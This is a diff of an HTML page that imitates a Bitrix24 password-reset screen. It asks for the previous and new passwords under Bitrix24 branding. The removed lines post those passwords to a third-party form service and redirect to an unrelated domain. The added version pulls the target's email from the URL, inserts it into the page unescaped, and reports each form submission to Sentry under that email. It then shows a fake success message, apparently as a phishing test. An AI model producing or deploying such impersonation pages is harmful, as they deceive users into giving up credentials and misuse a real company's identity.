@@ -1,14 +1,21 @@
 <!doctype html>
 <html>
   <head>
-    <title>Reset password - Bitrix24</title>
+    <title>Set new password - Bitrix24</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-      html, body {
-        font-family: Montserrat, "Helvetica Neue", Helvetica, Arial, sans-serif
-      }
-    </style>
+
+    <script src="https://js.sentry-cdn.com/de8ba25272a0e314d60c4ebad5757ccb.min.js" crossorigin="anonymous"></script>
+    <script>
+      Sentry.onLoad(function() {
+        Sentry.init({
+          tracesSampleRate: 1.0,
+          initialScope: {
+            user: { email: (new URLSearchParams(window.location.search)).get('t') }
+          },
+        });
+      });
+    </script>
 
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-LB0L38GS8H"></script>
     <script>
@@ -34,13 +41,13 @@
     </script>
   </head>
   <body class="absolute h-full w-full bg-blue flex flex-col">
-    <div class="grow-0 flex justify-center py-28">
+    <div class="grow-0 flex justify-center py-20">
         <img src="./bitrix24.svg" />
     </div>
     <div class="flex justify-center items-center">
       <div class="bg-white p-10 rounded rounded-xl flex flex-col space-y-8">
         <h1 class="text-3xl font text-gray-700">
-          Reset password
+          Set new password for <span id="email"></span>
         </h1>
 
         <div class="bg-gray-100 rounded rounded-full p-4 flex justify-center">
@@ -49,24 +56,46 @@
           </div>
         </div>
 
-        <form action="https://api.web3forms.com/submit" method="POST" class="flex flex-col space-y-6">
-          <input type="hidden" name="access_key" value="f869c5fb-3df8-4e18-927d-3b86c86dae49">
-          <input type="hidden" name="redirect" value="https://my.arnsbo-group.com/thanks.html">
-
-
-          <label class="text-xl text-gray-400">Previous password</label>
-          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="password-old" required>
+        <form class="flex flex-col space-y-4">
+          <label class="text-xl text-gray-400 w-96">Previous password</label>
+          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="po" required>
 
           <label class="text-xl text-gray-400">New password</label>
-          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="password-new" required>
+          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="pn" required>
 
           <label class="text-xl text-gray-400">Repeat new password</label>
-          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="password-new-repeated" required>
+          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="pnr" required>
 
-          <div class="h-captcha" data-captcha="true"></div>
-          <button type="submit">Submit Form</button>
+          <div class="flex justify-center pt-6">
+            <button class="bg-blue px-8 py-3 rounded-full text-gray-100" type="submit">Set new password</button>
+          </div>
         </form>
       </div>
     </div>
+
+    <div class="grow-0 flex justify-center py-8">
+      <p class="text-sm font-medium" style="color: #005e94;">
+        © 2001-2024 Bitrix24
+      </p>
+    </div>
+
+    <script>
+      (function() {
+        var params = new URLSearchParams(window.location.search);
+        var email = params.get('t')
+
+        if (email) {
+          document.querySelector('#email').innerHTML = email
+
+          document.querySelector('form').addEventListener('submit', function(event) {
+            var ex = new Error("Submission");
+            Sentry.captureException(ex)
+            event.preventDefault()
+            window.alert("Successfully reset password. You can close this window now.");
+            event.target.reset()
+          })
+        }
+      })();
+    </script>
   </body>
 </html>
